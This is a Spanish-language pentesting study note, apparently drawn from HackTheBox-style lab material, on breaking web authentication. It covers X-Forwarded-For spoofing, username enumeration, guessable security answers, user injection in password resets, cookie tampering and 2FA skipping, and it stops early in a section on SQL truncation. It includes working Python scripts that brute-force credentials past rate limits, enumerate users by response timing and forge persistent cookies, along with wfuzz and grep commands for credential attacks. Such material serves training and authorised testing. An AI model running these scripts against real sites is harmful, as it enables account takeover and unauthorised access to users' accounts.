

# Broken Authentication

## Table of contents

- [Broken Authentication](#broken-authentication)
  - [INTRODUCCION](#introduccion)
  - [¿Cuál es la diferencia entre autenticación y autorización?](#cul-es-la-diferencia-entre-autenticacin-y-autorizacin)
  - [HEADER X-FORWARDER-FOR](#header-x-forwarder-for)
  - [BYPASS RATE LIMIT PROTECTION](#bypass-rate-limit-protection)
  - [USERNAME ENUMERATION](#username-enumeration)
    - [CASOS DE EXPLOTACION](#casos-de-explotacion)
    - [Ataque de usuario desconocido (Unknow username)](#ataque-de-usuario-desconocido-unknow-username)
    - [Inferencia de existencia de nombre de usuario](#inferencia-de-existencia-de-nombre-de-usuario)
    - [Ataque de tiempo](#ataque-de-tiempo)
    - [Enumerar a través del restablecimiento de contraseña](#enumerar-a-travs-del-restablecimiento-de-contrasea)
    - [Enumerar a través del formulario de registro](#enumerar-a-travs-del-formulario-de-registro)
  - [PASSWORD BRUTE FORCE ATTACK](#password-brute-force-attack)
    - [Inferencia de políticas](#inferencia-de-polticas)
  - [Guessable Answers](#guessable-answers)
  - [USER INJECTION](#user-injection)
  - [MANIPULACION DE COOKIES](#manipulacion-de-cookies)
    - [Token encriptado o codificado](#token-encriptado-o-codificado)
      - [AUTOMATIZACION CON PYTHON](#automatizacion-con-python)
  - [SQL INJECTION (AUTH BYPASS)](#sql-injection-auth-bypass)
  - [SQL TRUNCATION](#sql-truncation)
    - [INTRODUCCION](#introduccion)
    - [EXPLICACION](#explicacion)
    - [POC](#poc)
    - [MITIGACIONES](#mitigaciones)
    - [PRACTICA](#practica)
  - [BYPASS CAPTCHA](#bypass-captcha)
  - [OAUTH BYPASS](#oauth-bypass)
  - [OTP BYPASS](#otp-bypass)

## INTRODUCCION
La autenticación es el proceso de verificar la identidad de un usuario o cliente determinado. En otras palabras, implica asegurarse de que realmente son quienes dicen ser.

Por lo tanto, los mecanismos de autenticación robustos son un aspecto integral de la seguridad web efectiva.

Hay tres factores de autenticación en los que se pueden clasificar los diferentes tipos de autenticación:

-   Algo que **sabes** , como una contraseña o la respuesta a una pregunta de seguridad. Estos a veces se denominan "factores de conocimiento".
-   Algo que **tienes** , es decir, un objeto físico como un teléfono móvil o token de seguridad. Estos a veces se denominan "factores de posesión".
-   Algo que **eres** o haces, por ejemplo, tu biometría o patrones de comportamiento. Estos a veces se denominan "factores de inherencia".

## ¿Cuál es la diferencia entre autenticación y autorización?

La autenticación es el proceso de verificar que un usuario **es realmente quien dice ser** , mientras que la autorización implica verificar si un usuario **puede hacer algo**.

## HEADER X-FORWARDER-FOR

Algunas aplicaciones web o firewalls de aplicaciones web aprovechan los encabezados `X-Forwarded-For`para adivinar la dirección IP de origen real. Esto se hace porque muchos proveedores de Internet, operadores de telefonía móvil o grandes corporaciones suelen "esconder" a los usuarios detrás de NAT. El bloqueo de una dirección IP sin la ayuda de un encabezado como `X-Forwarded-For` puede resultar en el bloqueo de todos los usuarios detrás de la NAT específica.

CODIGO DE VALIDACION INSUFICIENTE:

```php
<?php
// get IP address
if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
	$realip = array_map('trim', explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']))[0];
} else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
	$realip = array_map('trim', explode(',', $_SERVER['HTTP_CLIENT_IP']))[0];
} else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
	$realip = array_map('trim', explode(',', $_SERVER['REMOTE_ADDR']))[0];
}

echo "<div>Your real IP address is: " . htmlspecialchars($realip) . "</div>";
?>
```

Puede haber inicios de sesion que si la peticion proviene desde el localhost, puede saltarse:

```bash
"X-Forwarded-For": 127.0.0.1
```

>[!tip]
>Podemos colocar cualquier IP e incluso modificar el user-agent.

podemos iterar el valor de este header junto a un ataque **pitchfork** para que simule crear una IP diferente en cada intento:

![[Pasted image 20230205174259.png]]

## BYPASS RATE LIMIT PROTECTION

Otra protección estándar es la limitación de velocidad. Con un contador que aumenta después de cada intento fallido, una aplicación puede bloquear a un usuario después de tres intentos fallidos en 60 segundos y notifica al usuario en consecuencia.

![[Pasted image 20230120104926.png]]

Un ataque estándar de fuerza bruta no será eficiente cuando exista una limitación de velocidad. Cuando la herramienta utilizada no es consciente de esta protección, intentará combinaciones de nombre de usuario y contraseña que en realidad nunca son validadas por la aplicación web atacada.

Podemos usar este script para intentar enumerar credenciales en una pagina con esta proteccion:

```python
import requests
import time

#colors
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

# file that contain user:pass
userpass_file = "userpass.txt"

# create url using user and password as argument
url = "http://138.68.167.82:30771/login.php"

# rate limit blocks for 30 seconds
lock_time = 30

# message that alert us we hit rate limit
lock_message = "Too many login failures"

# read user and password
with open(userpass_file, "r") as fh:
    for fline in fh:
        # skip comment
        fline = fline.rstrip()
        if fline.startswith("#"):
            continue

        # take username
        username = fline.split(":")[0]

        # take password, join to keep password that contain a :
        password = ":".join(fline.split(":")[1:])

        # prepare POST data
        data = {
            "userid": username,
            "passwd": password,
            "submit": "submit"
        }

        # do the request
        res = requests.post(url, data=data)

        # handle generic credential error
        if "Invalid credentials" in res.text:
            print("{}[-] Invalid credentials: userid:{} passwd:{}{}".format(OKCYAN,username, password, ENDC))
        # user and password were valid !
        elif "Welcome" in res.text:
            print("{}[+] Valid credentials: userid:{} passwd:{}{}".format(OKGREEN,username, password,ENDC))
        # hit rate limit, let's say we have to wait 30 seconds
        elif lock_message in res.text:
            print(f"{WARNING}[-] Hit rate limit, sleeping 30{ENDC}")
            # do the actual sleep plus 0.5 to be sure
            time.sleep(lock_time+0.5)

```

ejecucion:

```bash
python3 rate.py
```

![[Pasted image 20230120223233.png]]

>[!tip]
>Este script funciona cuando el tiempo de espera es fijo y no incremental, pero podemos modificarlo para que el `lock_time` sea incremental.

## USERNAME ENUMERATION

Al intentar aplicar fuerza bruta a una página de inicio de sesión, debe prestar especial atención a las diferencias en:

-   **Códigos de estado**: durante un ataque de fuerza bruta, es probable que el código de estado HTTP devuelto sea el mismo para la gran mayoría de las conjeturas porque la mayoría de ellas serán incorrectas. Si una suposición devuelve un código de estado diferente, esta es una fuerte indicación de que el nombre de usuario era correcto. Es una buena práctica que los sitios web devuelvan siempre el mismo código de estado independientemente del resultado, pero esta práctica no siempre se sigue.
-   **Mensajes de error**: a veces, el mensaje de error devuelto es diferente dependiendo de si tanto el nombre de usuario como la contraseña son incorrectos o solo la contraseña era incorrecta. Es una buena práctica que los sitios web utilicen mensajes genéricos e idénticos en ambos casos, pero a veces se producen pequeños errores tipográficos. Solo un carácter fuera de lugar hace que los dos mensajes sean distintos, incluso en los casos en que el carácter no es visible en la página renderizada.
-   **Tiempos de respuesta**: si la mayoría de las solicitudes se manejaron con un tiempo de respuesta similar, cualquiera que se desvíe de esto sugiere que algo diferente estaba sucediendo detrás de escena. Esta es otra indicación de que el nombre de usuario adivinado podría ser correcto. Por ejemplo, un sitio web solo puede verificar si la contraseña es correcta si el nombre de usuario es válido. Este paso adicional puede causar un ligero aumento en el tiempo de respuesta. Esto puede ser sutil, pero un atacante puede hacer que esta demora sea más obvia al ingresar una contraseña demasiado larga que el sitio web tarde mucho más en manejar.
-   **Bloqueo de cuenta:** Una forma en que los sitios web intentan evitar la fuerza bruta es bloquear la cuenta si se cumplen ciertos criterios sospechosos, generalmente un número determinado de intentos fallidos de inicio de sesión. Al igual que con los errores de inicio de sesión normales, las respuestas del servidor que indican que una cuenta está bloqueada también pueden ayudar a un atacante a enumerar los nombres de usuario.

se pasa por alto con frecuencia, probablemente porque se supone que un nombre de usuario no es información privada. Cuando escribes un mensaje a otro usuario, comúnmente asumimos que conocemos su nombre de usuario, dirección de correo electrónico, etc. El mismo nombre de usuario a menudo se reutiliza para acceder a otros servicios como `FTP`, `RDP`y `SSH`, entre otros. Dado que muchas aplicaciones web nos permiten identificar nombres de usuario, deberíamos aprovechar esta funcionalidad y utilizarlos para ataques posteriores.

Con una lista de nombres de usuario válidos, un atacante puede reducir el alcance de un ataque de fuerza bruta o llevar a cabo ataques dirigidos (aprovechando OSINT) contra los empleados de soporte o los propios usuarios. Además, una contraseña común podría rociarse fácilmente contra cuentas válidas, lo que a menudo conduce a un compromiso exitoso de la cuenta.

Cabe señalar que los nombres de usuario también se pueden recolectar rastreando una aplicación web o utilizando información pública, por ejemplo, perfiles de empresas en redes sociales.

- [https://github.com/initstring/linkedin2username](https://github.com/initstring/linkedin2username)

### BLOQUEO DE IP (INTENTOS FALLIDOS)

- mensajes de error que indican que el usuario es invalido.
- intentos permitidos que se reestablecen cuando se ingresa un usuario valido, entonces es posible colocar de la siguiente manera:

```bash
usuario_a_enumerar
usuario_a_enumerar
usuario_valido
usuario_a_enumerar
usuario_a_enumerar
usuario_valido
usuario_a_enumerar
usuario_a_enumerar
usuario_valido
...
```

con eso se podra enumerar 2 usuario y el tercero reestablecera los intentos a 0.

### MENSAJES DE ERROR

![[normal.png]]

### MENSAJES DE ERROR SUTILMENTE DIFERENTES

Puede que estemos enumerando nombres de usuarios usando burpsuite y filtremos por un mensaje en la respuesta como `Invalid username or password.`  puede haber una diferencia minima en esa frase que indique un posible usuario valido como que ya no exista el punto del final:

![[Pasted image 20230205164902.png]]

### BLOQUEO DE CUENTA


### Ataque de usuario desconocido (Unknow username)

Cuando se produce un inicio de sesión fallido y la aplicación responde con **"`Unknown username`"** o un mensaje similar, un atacante puede realizar un ataque de fuerza bruta contra la funcionalidad de inicio de sesión en busca de un **"`The password you entered for the username X is incorrect`"** o un mensaje similar.

>[!tip]
> Durante una prueba de penetración, no olvide verificar también los nombres de usuario genéricos, como: helpdesk, tech, admin, demo, guest, etc.

[SecLists](https://github.com/danielmiessler/SecLists/tree/master/Usernames) proporciona una amplia colección de listas de palabras que se pueden utilizar como punto de partida para montar ataques de enumeración de usuarios.

```bash
wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://brokenauthentication.hackthebox.eu/user_unknown.php
```

- `–hs`: permiten filtrar las respuestas usando una expresión regular contra el contenido devuelto.

![[Pasted image 20230116165507.png]]

### Inferencia de existencia de nombre de usuario

A veces, una aplicación web puede no indicar explícitamente que no conoce un nombre de usuario específico, pero permite que un atacante infiera esta información. Algunas aplicaciones web completan automáticamente el valor de entrada del nombre de usuario si el nombre de usuario es válido y conocido, pero dejan el valor de entrada vacío o con un valor predeterminado cuando el nombre de usuario es desconocido. Esto es bastante común en las versiones móviles de los sitios web y también fue el caso en la página de inicio de sesión vulnerable de WordPress que vimos anteriormente.

Al probar una aplicación web iniciando sesión como un usuario desconocido, notamos un mensaje de error genérico y una página de inicio de sesión vacía:

![[Pasted image 20230116170023.png]]

Cuando intentamos iniciar sesión como usuario "admin", notamos que el campo de entrada está prellenado con (probablemente) un nombre de usuario válido, incluso si recibimos el mismo mensaje de error genérico:

![[Pasted image 20230116170040.png]]

### Ataque de tiempo

Algunas funciones de autenticación pueden contener defectos de diseño. Un ejemplo es una función de autenticación donde el nombre de usuario y la contraseña se verifican secuencialmente. Analicemos la siguiente rutina.

```php
<?php
// connect to database
$db = mysqli_connect("localhost", "dbuser", "dbpass", "dbname");

// retrieve row data for user
$result = $db->query('SELECT * FROM users WHERE username="'.safesql($_POST['user']).'" AND active=1');

// $db->query() replies True if there are at least a row (so a user), and False if there are no rows (so no users)
if ($result) {
  // retrieve a row. don't use this code if multiple rows are expected
  $row = mysqli_fetch_row($result);

  // hash password using custom algorithm
  $cpass = hash_password($_POST['password']);
  
  // check if received password matches with one stored in the database
  if ($cpass === $row['cpassword']) {
	echo "Welcome $row['username']";
  } else {
    echo "Invalid credentials.";
  } 
} else {
  echo "Invalid credentials.";
}
?>
```

El fragmento de código primero se conecta a la base de datos y luego ejecuta una consulta para recuperar una fila completa donde el nombre de usuario coincide con el solicitado. Si no hay resultados, la función finaliza con un mensaje genérico. Cuando `$result` es verdadero (el usuario existe y está activo), la contraseña proporcionada se codifica y se compara. Si el algoritmo hash utilizado es lo suficientemente fuerte, las diferencias de tiempo entre las dos ramas serán notables. Al calcular `$cpass`usando una función genérica `hash_password()`, el tiempo de respuesta será mayor que en el otro caso. Este pequeño error podría evitarse verificando el usuario y la contraseña en el mismo paso, teniendo un tiempo similar para los nombres de usuario válidos e inválidos.

vamos a probar esto con los siguientes archivos:

**timing.php**

Es una pagina vulnerable que, si bien no se conecta a una DB, simula ese proceso:

```php
<!DOCTYPE html>
<!-- starting standard HTML, you can safely skip until the end -->
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Broken Authentication Login - Timing example</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<style>
	.login-form {
		width: 340px;
    	margin: 50px auto;
	}
    .login-form form {
    	margin-bottom: 15px;
        background: #f7f7f7;
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        padding: 30px;
    }
    .login-form h2 {
        margin: 0 0 15px;
    }
    .form-control, .btn {
        min-height: 38px;
        border-radius: 2px;
    }
    .btn {
        font-size: 15px;
        font-weight: bold;
    }
</style>
</head>
<body>
<!-- ending standard HTML, you can safely skip until the end -->
<div class="login-form">
<?php
// if this scripts receives a POST with a userid field
if (isset($_POST['userid'])) {
  // if given userid is equal to admin
  if ($_POST['userid'] === "admin") {
    // bcrypt options
    $options = [ 'cost' => 11 ];
    // encrypt inputed password only if user is valid, this is where we can infer
    $bcrypt_hash = password_hash($_POST['passwd'], PASSWORD_BCRYPT, $options);
    // echo password_hash('htbpass', PASSWORD_BCRYPT, $options)."\n";
    if ($bcrypt_hash === '$2y$11$SbpCh9.r3xaRcaHz5UtZ9.gJBHpiHbzThs6fJ8ln7N/ce8pa1t/Gi') {
      // say welcome and exit
		  echo '<div class="alert alert-primary"><strong>Welcome, testuser!</strong> </div>';
      exit;
	  } else {
      // reply with a generic invalid credential message
		  echo '<div class="alert alert-warning"><strong>Invalid credential.</strong> </div>';
	  }
	} else {
    // reply with a generic invalid credential message
		echo '<div class="alert alert-warning"><strong>Invalid credential.</strong> </div>';
	}
}
// else show login form
?>
<!-- standard login form -->
    <form action="" method="POST">
        <h2 class="text-center">Log in</h2>
        <div class="form-group">
          <!-- name="userid" says that this field will be POSTed as userid -->
            <input name="userid" type="text" class="form-control" placeholder="Username" required="required">
        </div>
        <div class="form-group">
          <!-- name="passwd" says that this field will be POSTed as passwd -->
            <input name="passwd" type="password" class="form-control" placeholder="Password" required="required">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-primary btn-block">Log in</button>
        </div>
    </form>
</div>
</body>
</html>

```

```bash
#levantamos un servidor local
php -S 0.0.0.0:8080 
```

**timing.py**

```python
import sys
import requests
import os.path

# define target url, change as needed
url = "http://localhost:8080/timing.php"

# define a fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# define the string expected if valid account has been found. our basic PHP example replies with Welcome in case of success

valid = "Welcome"

"""
wordlist is expected as simple list, we keep this function to have it ready if needed.
for this test we are using /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
change this function if your wordlist has a different format
"""
def unpack(fline):
    userid = fline
    passwd = 'foobar'

    return userid, passwd

"""
our PHP example accepts requests via POST, and requires parameters as userid and passwd
"""
def do_req(url, userid, passwd, headers):
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)
    print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))

    return res.text

def main():
    # check if this script has been runned with an argument, and the argument exists and is a file
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    # open the file, this is our wordlist
    with open(fname) as fh:
        # read file line by line
        for fline in fh:
            # skip line if it starts with a comment
            if fline.startswith("#"):
                continue
            # use unpack() function to extract userid and password from wordlist, removing trailing newline
            userid, passwd = unpack(fline.rstrip())

            # call do_req() to do the HTTP request
            print("[-] Checking account {} {}".format(userid, passwd))
            res = do_req(url, userid, passwd, headers)

if __name__ == "__main__":
    main()
```

modificamos el target y el formato de la data enviada y lo ejecutamos contra el objetivo pasandole un diccionario de usernames:

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt

python3 timing.py top-usernames-shortlist.txt
```

![[Pasted image 20230116171751.png]]

es fácil identificar a "admin" como un usuario válido porque tomó mucho más tiempo que otros usuarios probados. Si el algoritmo utilizado fuera rápido, las diferencias de tiempo serían menores y un atacante podría tener un falso positivo debido a un retraso en la red o carga de la CPU.

>[!tip]
>Con un algoritmo como `bcrypt` es posible tener falsos positivos por lo rapido que es el algoritmo.

En este ejemplo el usuario **vagrant** es un posible usuario por el tiempo de respuesta:

![[Pasted image 20230120104320.png]]

### Enumerar a través del restablecimiento de contraseña

Los formularios de reinicio a menudo están menos protegidos que los de inicio de sesión. Por lo tanto, muy a menudo filtran información sobre un nombre de usuario válido o no válido. Como ya hemos comentado, una aplicación que responde con un " `You should receive a message shortly`" cuando se ha encontrado un nombre de usuario válido y " `Username unknown, check your data`" para una entrada no válida filtra la presencia de usuarios registrados.

Este ataque es ruidoso porque algunos usuarios válidos probablemente recibirán un correo electrónico que solicita un restablecimiento de contraseña. Dicho esto, estos correos electrónicos con frecuencia no reciben la atención adecuada de los usuarios finales.

### Enumerar a través del formulario de registro

De forma predeterminada, un formulario de registro que solicita a los usuarios que elijan su nombre de usuario generalmente responde con un mensaje claro cuando el nombre de usuario seleccionado ya existe o proporciona otras "indicaciones" si este es el caso. Al abusar de este comportamiento, un atacante podría registrar nombres de usuario comunes, como admin, administrador, técnico, para enumerar los válidos.

>[!tip]
>Una característica interesante de las direcciones de correo electrónico que muchas personas no conocen o no tienen en mente mientras realizan las pruebas es la subdirección. Esta extensión, definida en [RFC5233](https://tools.ietf.org/html/rfc5233) , dice que `+tag`el agente de transporte de correo (MTA) debe ignorar cualquiera que esté en la parte izquierda de una dirección de correo electrónico y usarla como una etiqueta para los filtros de tamiz. Esto significa que escribir a una dirección de correo electrónico como `student+htb@hackthebox.eu`enviará el correo electrónico `student@hackthebox.eu`y, si los filtros son compatibles y están configurados correctamente, se colocará en la carpeta `htb`. Muy pocas aplicaciones web respetan este RFC, lo que da la posibilidad de registrar casi infinitos usuarios mediante el uso de una etiqueta y una sola dirección de correo electrónico real.

## PASSWORD BRUTE FORCE ATTACK

### Inferencia de políticas

Las posibilidades de ejecutar un ataque de fuerza bruta con éxito aumentan después de una evaluación adecuada de la política. Saber cuáles son los requisitos mínimos de contraseña permite que un atacante comience a probar solo las contraseñas compatibles. Una aplicación web que implementa una política de contraseña segura podría hacer que un ataque de fuerza bruta sea casi imposible. Como desarrollador, elija siempre frases de contraseña largas en lugar de contraseñas cortas pero complejas. En prácticamente cualquier aplicación que permita el autorregistro, es posible inferir la política de contraseñas registrando un nuevo usuario. Intentar usar el nombre de usuario como contraseña, o una contraseña muy débil como `123456`, a menudo da como resultado un error que revelará la política (o algunas partes de ella) en un formato legible por humanos.

![[Pasted image 20230117144431.png]]

lo mas comun es:

-   caracteres en minúscula, como `abcd..z`
-   caracteres en mayúscula, como `ABCD..Z`
-   dígito, números de `0 to 9`
-   caracteres especiales, como `,./.? !`o cualquier otro imprimible ( `space` ¡es un carácter!)

filtrado de palabras con `grep`:

```bash
grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep -E '^.{8,12}$'
```

Grep es una herramienta que no ayudara muy bien a filtrar, en base a criterios, un diccionario. Piene unas palabras claves para filtrar criterios:

- `[[:lower:]]`:  filtra los resultados que tengan caracteres en minuscula [a-z].
- `[[:upper:]]`:  filtra los resultados que tengan caracteres en mayusculas [A-Z].
- `[[:digit:]]`:  filtra los resultados que tengan digitos [0-9].
- `[[:punct:]]`:  filtra los resultados que tengan caracteres especiales.

Puedes ver [mas filtros](https://www.petefreitag.com/cheatsheets/regex/character-classes/):

![[Pasted image 20230120113929.png]]

Como son patrones REGEX podemos unirlo a un patron: ``

Por ejemplo de una politica de contraseña: **"_Palabras capitalizadas (Primera letra en mayuscula) que necesitan tener al menos una letra minuscula, al menos un caracter especial, debe terminar en un digito y la longitud minima de la palabra es de 20 caracteres._"**

filtrado:

```bash
grep '^[[:upper:]]' /usr/share/wordlists/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]$' | grep '[[:punct:]]' | grep -E '^.{20,}$'
```

## Guessable Answers 

A menudo, las aplicaciones web autentican a los usuarios que perdieron su contraseña solicitándoles que respondan una o varias preguntas. Esas preguntas, generalmente presentadas al usuario durante la fase de registro, en su mayoría están codificadas y no pueden ser elegidas por él. Son, por tanto, bastante genéricos.

Suponiendo que hayamos encontrado dicha funcionalidad en un sitio web de destino, deberíamos intentar abusar de ella para evitar la autenticación. Es común encontrar preguntas como las siguientes.

-  " `Cual es el apellido de soltera de tu madre?`"
-  " `En que ciudad naciste?`"
-  "`Cual es tu color favorito?`"

La primera podría encontrarse usando `OSINT`, mientras que la respuesta a la segunda podría identificarse nuevamente usando `OSINT` o mediante un ataque de fuerza bruta al igual que la tercera.

veamos este ejemplo:

![[Pasted image 20230120103300.png]]

esta pregunta, si no tiene protecciones como **Token Anti-CSRF**, podemos intentar adivinarla a traves de fuerza bruta. Interceptamos con Burpsuite y lo mandamos al intruder:

![[Pasted image 20230120103437.png]]

usamos alguna lista de internet: [lista de colores en ingles](https://gist.githubusercontent.com/mordka/c65affdefccb7264efff77b836b5e717/raw/e65646a07849665b28a7ee641e5846a1a6a4a758/colors-list.txt)

al aplicar la fuerza bruta se puede adivinar la respuesta:

![[Pasted image 20230120103710.png]]

## USER INJECTION (VIA PASSWORD RESET)

### PARAMETRO USER NO PRESENTE

Al tratar de comprender la lógica de alto nivel detrás de un formulario de reinicio, no es importante si envía un token, una contraseña temporal o requiere la respuesta correcta. En un nivel alto, cuando un usuario ingresa el valor esperado, la funcionalidad de reinicio le permite cambiar la contraseña o pasar la fase de autenticación. La función que verifica si un token de restablecimiento es válido y también es el correcto para una cuenta determinada generalmente se desarrolla y prueba cuidadosamente teniendo en cuenta la seguridad. Sin embargo, a veces es vulnerable durante la segunda fase del proceso, cuando el usuario restablece la contraseña después de que se haya concedido el primer inicio de sesión.

Imagina el siguiente escenario. Después de crear una cuenta propia, solicitamos un restablecimiento de contraseña. Supongamos que nos encontramos con un formulario que se comporta de la siguiente manera.

![[Pasted image 20230117155058.png]]

Podemos intentar inyectar un nombre de usuario y/o dirección de correo electrónico diferente, buscando un posible valor de entrada oculto o adivinando cualquier nombre de entrada válido.

Una solicitud estándar tiene el siguiente aspecto.

![[Pasted image 20230117155707.png]]

Si modifica la solicitud agregando el campo `userid`, puede cambiar la contraseña de otro usuario.

![[Pasted image 20230117155733.png]]

### PARAMETRO USER PRESENTE

Si al momento de reestablecer la contraseña de nuestro usuario vemos que se envia el `username` como un parametro, podemos intentar modificar ese valor contra un usuario existente:

![[Pasted image 20230205162256.png]]

>[!tip]
>Podemos eliminar tokens y ver si igual funciona en caso de que esos valores se comprueben en una DB.
>

## MANIPULACION DE COOKIES

Al igual que los tokens de restablecimiento de contraseña, los tokens de sesión también pueden basarse en información adivinable. A menudo, las aplicaciones web caseras cuentan con un manejo de sesión personalizado y mecanismos de creación de cookies personalizados para tener a mano los detalles relacionados con el usuario. El dato más común que podemos encontrar en las cookies son las autorizaciones de los usuarios. Ya sea que un usuario sea administrador, operador o usuario básico, esta es información que puede ser parte de los datos utilizados para crear la cookie.

Consideremos el siguiente ejemplo.

![[Pasted image 20230117160322.png]]

La línea 4 de la respuesta del servidor muestra un encabezado `Set-Cookie` que establece como `SESSIONID` a  `757365723A6874623B726F6C653A75736572`. Si decodificamos este valor hexadecimal como ASCII, vemos que contiene nuestro `userid`, `htb` y rol (estándar `user`).

```bash
echo -n 757365723A6874623B726F6C653A75736572 | xxd -r -p; echo #user:htb;role:user
```

Podríamos intentar escalar nuestros privilegios dentro de la aplicación modificando la cookie `SESSIONID` para que contenga `role:admin`. Esta acción puede incluso permitirnos eludir la autenticación por completo.

### Token encriptado o codificado

Las cookies también pueden contener el resultado del cifrado de una secuencia de datos. Por supuesto, un algoritmo criptográfico débil podría conducir a una escalada de privilegios o a una omisión de autenticación, al igual que la codificación simple. El uso de criptografía débil ralentizará a un atacante.

A menudo, las aplicaciones web codifican tokens. Por ejemplo, algunos algoritmos de codificación, como la codificación hexadecimal y base64, pueden ser reconocidos por un ojo entrenado con solo echar un vistazo rápido al token. Otros son más complicados. Un token podría transformarse de alguna manera usando, por ejemplo, XOR o funciones de compresión antes de codificarse. Sugerimos verificar siempre los bytes mágicos cuando tenga una secuencia de bytes que le parezca basura, ya que pueden ayudarlo a identificar el formato.

>[!tip]
>Aqui [CyberChef](https://gchq.github.io/CyberChef/) es tu amigo.

Veamos este ejercicio practico:

En un login, cuando ingresamos con un usuario normal y seleccionamos la opcion **Remember me** nos muestra la siguiente cookie:

![[Pasted image 20230120154517.png]]

```bash
#token usuario: htbuser
eJwrLU4tssooSSoF0tZF%2BTmpVsUlpSmpeSXWJZm5qVaGZuYmRiaGJqYWAE4TDlM%3D
```

parece que usa una codificacion en base64, veamos con **Cyberchef**:

![[Pasted image 20230120154813.png]]

vemos que no nos muestra nada de informacion, esto no quiere decir que no sea vulnerable a tampering.
Vamos a encodearlo en Hexadecimal y ver los primeros bytes (Magic Bytes):

![[Pasted image 20230120154944.png]]

luego comparamos con este [listado de bytes magicos](https://en.wikipedia.org/wiki/List_of_file_signatures) si es que corresponde a alguno:

![[Pasted image 20230120155042.png]]

segun la firma esta usando una compresion **zlib**, nos apoyemos con **Cyberchef**, quitemos la conversion a Hexadecimal y colocamos la decompresion **zlib inflate**:

![[Pasted image 20230120161600.png]]

![[Pasted image 20230120161432.png]]

Y con eso podemos ver la informacion de la cookie. Ahora si podemos realizar el Tampering de la cookie.

#### AUTOMATIZACION CON PYTHON

A veces, las cookies se configuran con valores aleatorios o pseudoaleatorios, y una descodificación fácil no conduce a un ataque exitoso. Es por eso que a menudo necesitamos automatizar la creación y prueba de dichas cookies. Supongamos que tenemos una aplicación web que crea cookies persistentes a partir de la cadena _user_name:persistentcookie:random_5digit_value_ , luego codifica como base64 aplica ROT13 y convierte a hexadecimal para almacenarlo en una base de datos para que pueda verificarse más tarde.

podemos automatiza el proceso de descubrir una cookie valida con python:

```python
from base64 import b64encode
from binascii import hexlify
import codecs
import requests
from sys import exit

# create url using user and password as argument
url = "http://127.0.0.1/profile.php"

# assume cookie is set as
# PERSISTENT=6e554576714b41797077636a4d4b576d6e4b41304d4a35304c3239696e3279794277526d5a777433
# and decoded gives htbuser:persistentcookie:13287

# bruteforce the 5digit scope
for x in range(100000):

    # force the string to be 5 chars, even if it is smaller than 10000
    x = str(x).zfill(5)

    print ("[+] Testing {}\r".format(x))
    plaintext_cookie = "htbadmin:persistentcookie:{}".format(x)

    # step 1: to Base64
    x_step1 = b64encode(plaintext_cookie.encode()).decode()
    #print(x_step1)

    # step 2: rot13
    x_step2 = codecs.encode(x_step1, "rot-13").encode()
    #print(x_step2)

    # step 3: to hex
    encoded_cookie = hexlify(x_step2)
    #print(encoded_cookie)

    # set cookie, decoding because wants a string
    cookie = { "PERSISTENT": encoded_cookie.decode() }

    # do the request
    res = requests.get(url, cookies=cookie)

    # handle Welcome message, that should tell us we found a valid cookie
    if 'Welcome ' in res.text:
        print("[+] Valid cookie found: {}".format(encoded_cookie))
        # we don't need more check
        exit()
    # if we are prompted a login page, we probably don't have a valid cookie
    elif 'Login ' in res.text:
        continue
    # we should never be here, notify in case
    else:
        print("[-] Unexpected reply, please manually check cookie {}".format(encoded_cookie))
```

## 2FA SIMPLE BYPASS

supongamos que una pagina tiene implementado un 2FA con email en su login, podemos iniciar sesion con nuestra cuenta:

![[Pasted image 20230205153202.png]]

nos pedira el 2FA que nos llegara a nuestro correo:

![[Pasted image 20230205153247.png]]

![[Pasted image 20230205153304.png]]

con eso logramos ingresar a nuestra cuenta de usuario:

![[Pasted image 20230205153356.png]]

la ruta en la URL es `my-account`, si tenemos otras credenciales validas, podemos evadir el 2FA, despues de colocar las credenciales validas, ir directamente a la ruta de `my-account`:

## SQL INJECTION (AUTH BYPASS)

Ver la parte de login bypass del archivo SQL injection:

- [[hacking_web/4. Web attacks/SQL Injection/SQL injection]]

## SQL TRUNCATION

### INTRODUCCION

El truncamiento de SQL es una falla en la configuración de la base de datos en la que una entrada se trunca (elimina) cuando se agrega a la base de datos debido a que supera la longitud máxima definida. El sistema de administración de la base de datos trunca los valores recién insertados para que se ajusten al ancho del tamaño de columna designado.

Entonces, ¿ **_dónde podemos encontrar esta vulnerabilidad?_** se puede encontrar en cualquier aplicación web que permita a los usuarios **_registrarse_** para obtener nuevas cuentas.

